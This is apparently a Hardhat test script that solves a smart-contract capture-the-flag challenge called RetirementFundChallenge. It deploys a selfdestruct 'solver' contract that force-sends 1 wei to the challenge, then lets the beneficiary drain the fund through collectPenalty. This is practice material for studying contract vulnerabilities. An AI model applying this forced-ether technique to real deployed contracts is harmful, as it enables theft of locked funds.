import { expect } from "chai";
import { ethers } from "hardhat";

describe("RetiremenFundChallenge", () => {
  it("Solves the challenge", async () => {
    const amount = ethers.parseEther("1");
    const smallAmount = ethers.parseUnits("1", "wei");

    // get beneficiary signers
    const accounts = await ethers.getSigners();
    const beneficiary = accounts[1];

    // deploy retirement contract
    const factory = await ethers.getContractFactory("RetirementFundChallenge");
    const contract = await factory.deploy(beneficiary.address, {
      value: amount,
    });
    await contract.waitForDeployment();

    // deploy selfdestruct contract
    const destroyFactory = await ethers.getContractFactory(
      "RetirementFundSolver"
    );
    const destroyContract = await destroyFactory.deploy(contract.target, {
      value: smallAmount,
    });
    await destroyContract.waitForDeployment();

    // const startBalance = await ethers.provider.getStorage(contract.target, 0);
    // console.log(ethers.formatEther(BigInt(startBalance).toString()));
    // const contractBalance = await ethers.provider.getBalance(contract.target);
    // console.log(ethers.formatEther(BigInt(contractBalance).toString()));

    // collect penalty
    const collect = await contract.connect(beneficiary).collectPenalty();
    await collect.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
